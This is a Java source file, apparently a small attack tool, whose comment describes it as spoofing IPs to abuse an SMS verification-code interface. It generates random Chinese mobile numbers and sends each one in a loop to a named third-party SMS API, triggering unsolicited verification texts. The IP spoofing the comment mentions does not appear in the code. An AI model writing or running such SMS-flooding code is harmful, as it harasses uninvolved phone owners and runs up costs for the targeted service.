package com.dygj.main.safe.out;

import com.dygj.main.utils.HttpUtils;
import com.google.gson.Gson;

import java.util.HashMap;
import java.util.Random;


/**
 * 需求：伪造IP刷短信接口
 * 网址：https://produce.storesound.com/#/login?VNK=e16de1a9
 * 验证码接口：https://api.hottermusic.com:33338/api/sms/get
 *
 * @Auther:Lipf
 */
public class SmsSend {

    public static void main(String[] args) {

        int count = 20;
        for (int i = 0; i < count; i++) {
            // 获取手机号
            String phone = generateMobileNumber();
            // 发送验证码
            sendSms(phone);
        }

    }


    /**
     * 生成手机号码
     *
     * @return
     */
    public static String generateMobileNumber() {
        // 中国大陆手机号码前三位固定为13x, 14x, 15x, 16x, 17x, 18x, 19x
        String[] Prefixes = {"13", "14", "15", "16", "17", "18", "19"};
        int MobileLength = 11; // 手机号码长度

        Random random = new Random();
        StringBuilder mobileNumber = new StringBuilder();
        // 随机选择一个前缀
        mobileNumber.append(Prefixes[random.nextInt(Prefixes.length)]);
        // 生成后面的9位数字
        for (int i = 0; i < MobileLength - 2; i++) {
            mobileNumber.append(random.nextInt(10));
        }
        return mobileNumber.toString();
    }

    /**
     * 发送短信
     *
     * @return
     */
    public static void sendSms(String phone) {
        String param = "phone=" + phone + "&languagetype=0";
        String resStr = HttpUtils.doPostOrGet(null,"https://api.hottermusic.com:33338/api/sms/get", param, "POST", true);
        System.out.println(phone + "\t ApiResult：" + resStr);
        Gson gson = new Gson();
        HashMap<String, String> res = gson.fromJson(resStr, HashMap.class);
        if (!"1".equals(res.get("resultcode"))) {
            System.err.println(phone + "\t Error：" + res.get("message"));
        }
    }

}